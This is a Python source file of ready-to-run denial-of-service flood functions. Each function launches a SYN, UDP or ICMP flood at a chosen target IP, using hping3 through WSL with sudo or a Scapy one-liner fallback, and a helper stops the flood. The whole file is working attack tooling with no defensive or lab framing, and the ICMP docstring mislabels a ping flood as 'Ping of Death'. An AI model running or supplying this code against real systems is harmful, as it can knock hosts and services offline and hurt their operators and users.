"""
Flood attack modules: SYN, UDP, and ICMP floods using WSL hping3 with pure Python/Scapy fallback.
"""
import shutil
import subprocess
import time
from typing import Optional


def _is_wsl_available() -> bool:
    return shutil.which("wsl") is not None


def syn_flood(
    target_ip: str,
    target_port: int = 80,
    duration: int = 30,
    rate: int = 100,
) -> subprocess.Popen:
    """
    Launch SYN flood against target IP.
    Executes: wsl -e sudo hping3 -S -p {port} --flood -c {rate*duration} {target_ip}
    """
    count = rate * duration
    if _is_wsl_available():
        cmd = [
            "wsl", "-e", "sudo", "hping3", "-S",
            "-p", str(target_port),
            "--flood",
            "-c", str(count),
            target_ip
        ]
    else:
        # Pure Python scapy fallback
        cmd = [
            "python", "-c",
            f"from scapy.all import *; import time; end=time.time()+{duration}; "
            f"pkt=IP(dst='{target_ip}')/TCP(dport={target_port},flags='S'); "
            f"send(pkt, loop=1, inter=0.005, verbose=0)"
        ]

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return proc


def udp_flood(
    target_ip: str,
    target_port: int = 53,
    duration: int = 30,
    packet_size: int = 512,
    count: int = 5000,
) -> subprocess.Popen:
    """
    Launch UDP flood against target IP.
    Executes: wsl -e sudo hping3 --udp -p {port} --flood -d {size} -c {count} {target_ip}
    """
    if _is_wsl_available():
        cmd = [
            "wsl", "-e", "sudo", "hping3", "--udp",
            "-p", str(target_port),
            "--flood",
            "-d", str(packet_size),
            "-c", str(count),
            target_ip
        ]
    else:
        cmd = [
            "python", "-c",
            f"from scapy.all import *; import time; "
            f"pkt=IP(dst='{target_ip}')/UDP(dport={target_port})/Raw(b'X'*{packet_size}); "
            f"send(pkt, loop=1, inter=0.005, verbose=0)"
        ]

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return proc


def icmp_flood(
    target_ip: str,
    duration: int = 30,
    packet_size: int = 1024,
    count: int = 5000,
) -> subprocess.Popen:
    """
    Launch ICMP flood (Ping of Death / Ping flood) against target IP.
    Executes: wsl -e sudo hping3 --icmp --flood -d {size} -c {count} {target_ip}
    """
    if _is_wsl_available():
        cmd = [
            "wsl", "-e", "sudo", "hping3", "--icmp",
            "--flood",
            "-d", str(packet_size),
            "-c", str(count),
            target_ip
        ]
    else:
        cmd = [
            "python", "-c",
            f"from scapy.all import *; "
            f"pkt=IP(dst='{target_ip}')/ICMP()/Raw(b'X'*{packet_size}); "
            f"send(pkt, loop=1, inter=0.005, verbose=0)"
        ]

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return proc


def stop_flood(proc: subprocess.Popen) -> None:
    """Terminates active flood process."""
    if proc and proc.poll() is None:
        try:
            proc.terminate()
            proc.wait(timeout=2.0)
        except Exception:
            proc.kill()

